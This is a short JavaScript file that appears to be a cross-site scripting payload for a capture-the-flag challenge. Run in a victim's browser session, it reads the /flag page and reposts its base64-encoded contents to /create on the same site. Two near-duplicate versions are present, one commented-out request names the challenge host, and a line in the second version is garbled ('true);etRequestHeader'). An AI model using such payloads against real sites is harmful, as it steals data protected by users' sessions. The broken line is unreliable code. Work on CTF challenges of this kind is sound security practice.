var req1 = new XMLHttpRequest();
req1.open("GET", "/flag");
req1.onload = function() {
    var req2 = new XMLHttpRequest();
    var url = '/create';
    var params = 'title=ipsum&body=' + btoa(this.responseText);
    req2.open('POST', url, true);
    req2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    req2.onload = function () {
        console.log(this.responseText)
    }
    req2.send(params);
}
req1.send()

// fetch("http://io5.ept.gg:32724/create", {
//   "headers": {
//     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
//     "accept-language": "en-US,en;q=0.7",
//     "cache-control": "max-age=0",
//     "content-type": "application/x-www-form-urlencoded",
//     "sec-gpc": "1",
//     "upgrade-insecure-requests": "1"
//   },
//   "referrer": "http://io5.ept.gg:32724/create",
//   "referrerPolicy": "strict-origin-when-cross-origin",
//   "body": "title=test&body=test",
//   "method": "POST",
//   "mode": "cors",
//   "credentials": "include"
// });

var xhr = new XMLHttpRequest();
// we defined the xhr

xhr.onreadystatechange = function () {
    if (this.readyState != 4) return;

    if (this.status == 200) {
        var data = this.responseText;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/create", true);etRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        xhr.send("title=joev2&body=" + btoa(data));

        // we get the returned data
    }

    // end of state change: it can be after some time (async)
};


xhr.open('GET', "/flag", true);
xhr.send();
// send --- vent til request kommer tilbake ---> request kom tilbake --> on ready state change ---> Post request